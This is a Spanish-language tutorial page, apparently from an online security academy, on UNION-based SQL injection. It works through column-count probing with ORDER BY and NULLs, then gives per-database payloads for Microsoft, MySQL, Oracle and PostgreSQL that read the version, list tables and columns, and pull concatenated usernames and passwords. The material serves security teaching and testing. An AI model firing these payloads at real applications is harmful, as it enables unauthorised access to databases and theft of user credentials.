---
title: Inyecciones SQL basadas en UNION SELECT
description: Explicación de las inyecciones SQL basadas en UNION SELECT.
layout: academia_lesson
parent: /academia/ciberseguridad/documentacion/auditorias-web/inyecciones-sql/segun-el-canal-de-comunicacion/en-banda/
author: ElStitchMalo
date: 16/12/2025
updated:
tags: [inyecciones SQL basadas en UNION SELECT]
---

Se puede usar la palabra clave `UNION` para recuperar datos de otras tablas de la base de datos. 

Esta palabra clave `UNION` permite ejecutar una o más consultas `SELECT` adicionales y agregar los resultados a la consulta original. Por ejemplo:

~~~ sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
~~~

Esta consulta SQL devuelve un único conjunto de resultados con dos columnas, que contienen valores de las columnas `a` y `b` en `table1` y de las columnas `c` y `d` en `table2`.

### Requisitos

- Las consultas individuales deben devolver el mismo número de columnas.
- Los tipos de datos de cada columna deben ser compatibles entre las distintas consultas.

### Determinar el número de columnas necesarias

Existen dos métodos efectivos para determinar cuántas columnas se devuelven de la consulta original.

- Insertando la cláusula `ORDER BY` e incrementar el indice de la columna especificada **hasta que se produzca un error**. Por ejemplo:

    ~~~ 
    # Microsoft, PostgreSQL, Oracle

    ' ORDER BY 1 --
    ' ORDER BY 2 --
    ' ORDER BY 3 --
    ~~~

- Insertando `UNION SELECT` e incrementando la cantidad de valores `NULL`. Por ejemplo:

    ~~~
    # Microsoft, PostgreSQL

    ' UNION SELECT NULL --
    ' UNION SELECT NULL,NULL --
    ' UNION SELECT NULL,NULL,NULL --
    ~~~

    Si el número de valores `NULL` **no coincide** con el número de columnas, la base de datos **devuelve un error**.  

    **Cuando el número de valores nulos coincide** con el número de columnas, la base de datos **devuelve una fila adicional** en el conjunto de resultados, que contiene valores nulos en cada columna.  

Una vez determinado el número de columnas necesarias, se puede comprobar si cada una admite datos de texto, enviando una serie `UNION SELECT` que inserten un valor de texto en cada columna sucesivamente. Por ejemplo, si la consulta devuelve cuatro columnas, se enviaría:

~~~ 
# Microsoft, PostgreSQL

' UNION SELECT 'a',NULL,NULL,NULL --
' UNION SELECT NULL,'a',NULL,NULL --
' UNION SELECT NULL,NULL,'a',NULL --
' UNION SELECT NULL,NULL,NULL,'a' --
~~~

### Ejemplos de ataque

#### Extraer información sobre la versión de la base de datos

A continuación, se muestran algunos ejemplos de como **extraer información sobre la versión de la base de datos** utilizando ataques basados en `UNION`:

~~~
# Microsoft

' UNION SELECT @@version --
' UNION SELECT NULL,@@version --
~~~
~~~
# MySQL

' UNION SELECT @@version #
' UNION SELECT NULL,@@version #
~~~
~~~
# Oracle

' UNION SELECT BANNER FROM v$version --
' UNION SELECT NULL,BANNER_FULL FROM v$version --
~~~
~~~
# PostgreSQL

' UNION SELECT version() --
' UNION SELECT NULL,version() --
~~~

#### Extraer información sobre el contenido de la base de datos

A continuación, se muestra un ejemplo de como **extraer información sobre el contenido de las tablas** en **Microsoft**:

~~~
# Microsoft

' UNION SELECT table_name,NULL FROM information_schema.tables --
~~~

A continuación, se muestra un ejemplo de como **extraer información sobre el contenido de las columnas** en **MySQL**:

~~~
# MySQL

' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users' #
~~~

A continuación, se muestra un ejemplo de como **extraer información sobre el contenido de las tablas** en **Oracle**:

~~~
# Oracle

' UNION SELECT table_name,NULL FROM all_tables --
~~~

A continuación, se muestra un ejemplo de como **extraer información sobre el contenido de las columnas** en **Oracle**:

~~~
# Oracle

' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'users' --
~~~

#### Recuperar múltiples valores dentro de una sola columna

A continuación, se muestran algunos ejemplos:

~~~
# Oracle, PostgreSQL

' UNION SELECT username || '~' || password FROM users --
~~~

~~~
# Microsoft

' UNION SELECT username + '~' + password FROM users --
~~~

~~~
# MySQL

' UNION SELECT CONCAT(username, '~', password) FROM users #
~~~